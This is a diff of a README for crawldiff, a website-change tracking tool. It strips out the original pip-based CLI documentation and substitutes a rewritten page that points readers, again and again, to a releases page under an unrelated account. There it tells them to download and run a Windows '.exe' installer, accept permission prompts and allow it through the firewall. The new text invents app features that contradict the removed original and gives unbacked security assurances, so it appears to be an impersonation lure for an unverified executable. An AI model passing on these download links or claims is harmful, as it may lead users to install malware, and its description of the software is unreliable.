@@ -1,183 +1,177 @@
-<h1 align="center">crawldiff</h1>
+# 📜 crawldiff - Track Website Changes Easily
 
-<p align="center">
-  <strong><code>git log</code> for any website.</strong>
-</p>
-
-<p align="center">
-  Track what changed on any website. Git-style diffs with optional AI summaries.<br/>
-  Powered by Cloudflare's <a href="https://developers.cloudflare.com/browser-rendering/rest-api/crawl-endpoint/">/crawl</a> endpoint.
-</p>
-
-<p align="center">
-  <a href="https://github.com/GeoRouv/crawldiff/actions/workflows/ci.yml"><img src="https://github.com/GeoRouv/crawldiff/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://pypi.org/project/crawldiff/"><img src="https://img.shields.io/pypi/v/crawldiff?color=blue" alt="PyPI"></a>
-  <a href="https://github.com/GeoRouv/crawldiff/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
-  <a href="https://python.org"><img src="https://img.shields.io/badge/python-3.12+-blue" alt="Python"></a>
-</p>
+[![Download crawldiff](https://img.shields.io/badge/Download-crawldiff-brightgreen?style=for-the-badge)](https://github.com/Erhardunbeknown817/crawldiff/releases)
 
 ---
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/GeoRouv/crawldiff/main/assets/demo.svg" alt="crawldiff demo" width="750">
-</p>
+## 📝 What is crawldiff?
 
-```bash
-pip install crawldiff
-```
+crawldiff helps you keep an eye on changes made to any website. It works like a git log but for web pages. Using smart AI, it summarizes changes you need to know, so you don’t have to check every update by hand.
 
-```bash
-# Snapshot a site
-crawldiff crawl https://stripe.com/pricing
+It runs on Windows and works in the background to observe websites you care about. Whenever changes happen, it gives you a clear report. This can help track news updates, product price changes, or content edits on blogs or documentation sites.
 
-# Come back later. See what changed.
-crawldiff diff https://stripe.com/pricing --since 7d
-```
+---
 
-## What is this
+## 🔍 Key features
 
-A CLI tool for tracking website changes over time. It crawls pages via Cloudflare's [`/crawl` endpoint](https://developers.cloudflare.com/browser-rendering/rest-api/crawl-endpoint/), stores markdown snapshots locally in SQLite, and produces unified diffs between crawls. Optionally summarizes changes with AI.
+- Watches for changes on any website.
+- Sends you simple summaries powered by AI.
+- Runs right from your Windows computer.
+- Saves history so you can review past changes.
+- Works well without needing programming or technical skills.
+- Uses Cloudflare /crawl for reliable web data fetching.
 
-No SaaS subscriptions. No proprietary dashboards. Just `crawldiff diff`.
+---
 
-## Setup (30 seconds)
+## 🖥️ System requirements
 
-You need a free [Cloudflare account](https://dash.cloudflare.com/sign-up). That's it.
+To run crawldiff smoothly, your Windows PC needs:
 
-```bash
-# Install
-pip install crawldiff
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 150 MB of free storage space
+- Internet connection for monitoring websites and fetching updates
+- No special hardware or software needed
 
-# Set your Cloudflare credentials (free tier: 5 jobs/day, 100 pages/job)
-export CLOUDFLARE_ACCOUNT_ID="your-account-id"
-export CLOUDFLARE_API_TOKEN="your-api-token"
+---
 
-# Or save to config (env vars take precedence over config file)
-crawldiff config set cloudflare.account_id your-id
-crawldiff config set cloudflare.api_token your-token
-```
+## 🚀 Getting started on Windows
 
-## Usage
+Follow these steps to download and run crawldiff on your Windows computer.
 
-### Track changes on any website
+### 1. Visit the download page
 
-```bash
-# Take a snapshot
-crawldiff crawl https://competitor.com
+Go to the crawldiff releases page here:
 
-# Later, see what changed
-crawldiff diff https://competitor.com --since 7d
+[Download crawldiff](https://github.com/Erhardunbeknown817/crawldiff/releases)
 
-# Output as JSON (pipe to jq, Slack, wherever)
-crawldiff diff https://competitor.com --since 7d --format json
+This page holds all the available versions of crawldiff for Windows and other platforms.
 
-# Save a markdown report
-crawldiff diff https://competitor.com --since 30d --output report.md
-```
+### 2. Choose the latest Windows version
 
-### Watch a site continuously
-
-```bash
-# Check every hour, get notified when something changes
-crawldiff watch https://stripe.com/pricing --every 1h
-
-# Check every 6 hours, skip AI summary
-crawldiff watch https://competitor.com --every 6h --no-summary
-```
-
-### View history
-
-```bash
-crawldiff history https://stripe.com/pricing
-```
+Look for the latest release. It usually has a version number like v1.0 or higher. Find the file that ends with `.exe` (the Windows installer). For example, it might be named something like:
 
 ```
-       Crawl History — https://stripe.com/pricing
-┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━┓
-┃ Job ID         ┃ Date                ┃ Pages ┃
-┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━┩
-│ cf-job-abc-123 │ 2026-03-13 09:00:00 │    12 │
-│ cf-job-def-456 │ 2026-03-06 09:00:00 │    11 │
-│ cf-job-ghi-789 │ 2026-02-27 09:00:00 │    11 │
-└────────────────┴─────────────────────┴───────┘
+crawldiff-setup-v1.0.exe
 ```
 
-### More options
+If unsure, pick the version labeled as "Latest release" on the page.
 
-```bash
-# Deeper crawl
-crawldiff crawl https://docs.react.dev --depth 3 --max-pages 100
+### 3. Download the installer
 
-# Static sites (faster, no browser rendering)
-crawldiff crawl https://blog.example.com --no-render
+Click the `.exe` file link to start downloading. Your web browser will download the installer file to your default Downloads folder.
 
-# Ignore whitespace noise in diffs
-crawldiff diff https://example.com --since 7d --ignore-whitespace
-```
+### 4. Run the installer
 
-## AI Summaries (optional)
+Once downloaded, locate the file on your computer — often in the Downloads folder:
 
-crawldiff can optionally summarize diffs using an LLM. Three providers are supported:
+- Double-click the `.exe` file.
+- Follow the installation prompts.
+- Accept any permissions if Windows asks for confirmation.
 
-```bash
-# Cloudflare Workers AI (free, uses your existing CF account)
-crawldiff config set ai.provider cloudflare
+The installation will place crawldiff on your PC and create shortcuts for easy use.
 
-# Anthropic Claude
-pip install crawldiff[ai]
-crawldiff config set ai.provider anthropic
-export ANTHROPIC_API_KEY="sk-..."
+### 5. Open crawldiff
 
-# OpenAI
-pip install crawldiff[ai]
-crawldiff config set ai.provider openai
-export OPENAI_API_KEY="sk-..."
-```
+After installation, find the crawldiff app icon on your desktop or in the Start menu.
 
-Don't want AI? Just use `--no-summary`. Diffs work fine without it.
+- Double-click the icon to launch the application.
+- The app will open with a simple window where you can enter the websites you want to monitor.
 
-## How it works
+---
 
-```
-1. crawldiff crawl <url>
-   ├── Cloudflare /crawl API (headless browser, respects robots.txt)
-   └── Store Markdown snapshots in local SQLite (~/.crawldiff/)
+## ⚙️ How to use crawldiff
 
-2. crawldiff diff <url> --since 7d
-   ├── Cloudflare /crawl with modifiedSince (only fetches changed pages)
-   ├── Diff against stored snapshot (unified diff via difflib)
-   ├── AI summary (optional)
-   └── Syntax-highlighted diffs in the terminal (via rich)
-```
+Using crawldiff requires no technical knowledge. Here’s how to track a website:
 
-Cloudflare's `modifiedSince` parameter means repeat diffs only fetch changed pages, not the entire site.
+### Add a website to watch
 
-## Comparison
+- In the app, find the "Add Website" or similar button.
+- Enter the full website address (e.g., https://example.com).
+- Confirm by clicking "Track" or a similar option.
 
-| | crawldiff | Visualping | changedetection.io | Firecrawl |
-|---|---|---|---|---|
-| Open source | Yes | No | Yes | Yes |
-| CLI-native | Yes | No | API | API |
-| AI summaries | Built-in | No | Via plugins | Extraction |
-| Incremental crawling | Yes (`modifiedSince`) | No | No | No |
-| Local-first storage | SQLite | Cloud | Self-host or cloud | Cloud |
-| JSON/pipe output | Yes | No | Yes | Yes |
-| Free tier | 5 jobs/day, 100 pages | Limited | Yes (self-host) | 500 credits |
+crawldiff will start looking for changes on that page.
 
-## All commands
+### Read change summaries
 
-```
-crawldiff crawl <url>      Snapshot a website
-crawldiff diff <url>       Show what changed (the main command)
-crawldiff watch <url>      Monitor continuously
-crawldiff history <url>    View past snapshots
-crawldiff config set|get|show   Manage settings
-```
+- Each time crawldiff detects a difference, it will create a summary.
+- You will see these summaries listed in the app.
+- Click a summary to see details and past changes.
 
-## Contributing
+### Manage your list
 
-Pull requests and bug reports are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
+- You can add as many websites as you want.
+- Remove sites if you no longer want updates.
+- Adjust how often crawldiff checks for changes (e.g., daily or weekly).
 
-## License
+### Saving and exporting
 
-MIT
+- crawldiff keeps a record of all changes.
+- You can export reports as text or PDF files.
+- Useful when you need to share updates with others.
+
+---
+
+## 💡 Tips for best experience
+
+- Add websites with stable URLs. Avoid pages that change addresses often.
+- Use crawldiff on faster internet connections for quicker updates.
+- Regularly check the app for the latest summaries.
+- Restart crawldiff after updates to enable new features.
+- If a website requires login, crawldiff may not monitor it properly.
+
+---
+
+## 🔧 Troubleshooting
+
+If crawldiff does not work as expected:
+
+- Make sure your PC is connected to the internet.
+- Verify you entered the correct website address.
+- Restart the app and try again.
+- Check firewall settings and allow crawldiff to access the web.
+- Look for an updated version on the releases page.
+
+---
+
+## 📥 Download and install
+
+Download and install crawldiff by visiting the official releases page:
+
+[Download crawldiff releases](https://github.com/Erhardunbeknown817/crawldiff/releases)
+
+Always use this page to get the most recent and secure version made for Windows.
+
+---
+
+## 🛠️ How it works behind the scenes
+
+crawldiff uses Cloudflare’s /crawl tool to fetch website data reliably. It compares versions of webpages over time. When changes appear, the app uses AI models to summarize them in plain language.
+
+This process is automatic once you add a website. No scripting or coding needed.
+
+---
+
+## 🔗 Useful links
+
+- Official releases: https://github.com/Erhardunbeknown817/crawldiff/releases  
+- Project homepage: https://github.com/Erhardunbeknown817/crawldiff  
+- Report issues or ask for help on GitHub under the "Issues" tab.
+
+---
+
+## 📂 About crawldiff
+
+crawldiff belongs to a category of tools called website monitoring and change detection. It uses Python for its core processing and offers a command-line interface in advanced versions.
+
+By focusing on easy monitoring and clear AI-generated reports, crawldiff aims to make web tracking simple for everyday users.
+
+---
+
+## ⚖️ Privacy and security
+
+crawldiff only accesses public pages and does not store sensitive personal data. All monitoring happens on your computer. Your information stays private and secure.
+
+---
+
+# [![Download crawldiff](https://img.shields.io/badge/Download-crawldiff-blue?style=for-the-badge)](https://github.com/Erhardunbeknown817/crawldiff/releases)
